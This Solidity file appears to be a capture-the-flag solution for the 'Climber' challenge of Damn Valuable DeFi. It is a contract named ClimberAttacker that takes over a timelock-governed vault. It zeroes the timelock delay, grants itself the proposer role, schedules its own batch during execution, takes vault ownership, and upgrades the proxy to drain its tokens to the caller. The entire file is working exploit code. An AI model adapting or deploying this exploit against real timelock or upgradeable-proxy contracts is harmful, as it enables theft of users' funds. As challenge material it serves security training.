pragma solidity ^0.8.0;

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "../DamnValuableToken.sol";

contract ClimberAttacker{

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    address public attacker;
    address public vaultProxy;
    address public newImpl;
    ClimberTimelock public timelock;
    DamnValuableToken public token;

    /* call execute with following operations:
    1. updateDelay to 0
    2. setRole of this contract to be proposer
    3. schedule the operation
    4. update the cimbervault
    5. sweep the money!
    */

    constructor(address vaultAddr, address payable timelockAddr, address tokenAddr, address _newImpl) {
        attacker = msg.sender;
        vaultProxy = vaultAddr;
        timelock = ClimberTimelock(timelockAddr);
        token = DamnValuableToken(tokenAddr);
        newImpl = _newImpl;
    }

    function buildParameter() internal view
        returns(address[] memory targets, 
                uint256[] memory values, 
                bytes[] memory dataElements){
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            timelock.updateDelay.selector,
            0
            );

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            timelock.PROPOSER_ROLE(),
            address(this)
        );

        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            this.executeSchedule.selector
        );

        targets[3] = vaultProxy;
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );
    }

    function executeSchedule() public {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildParameter();
        timelock.schedule(targets, values, dataElements, 0);
    }

    function attack() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildParameter();
        timelock.execute(targets, values, dataElements, 0);
        ClimberVault(vaultProxy).upgradeToAndCall(
            newImpl,
            abi.encodeWithSignature(
                "hack(address,address)",
                address(token),
                msg.sender
            )
        );
    }

}